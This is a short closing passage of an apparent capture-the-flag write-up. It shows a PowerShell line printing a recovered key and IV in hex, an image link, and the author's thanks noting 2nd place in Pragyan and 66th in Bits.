>> Write-Output "IV: $ivHex"
>>
Key: 6A5A19B532EC03A2E5444D3107240BC770159241E9010A314CE77B5A1F002BBD
IV: 2BBBC8587CB11C7874545299E41D3AC1
```

![image](https://hackmd.io/_uploads/Bkda4rwKJl.png)

--- 

Thank you for reading until now, It's my honor that you read up until now, It was a fun weekend I had, we managed to placed 2nd in Pragyan and 66th in Bits



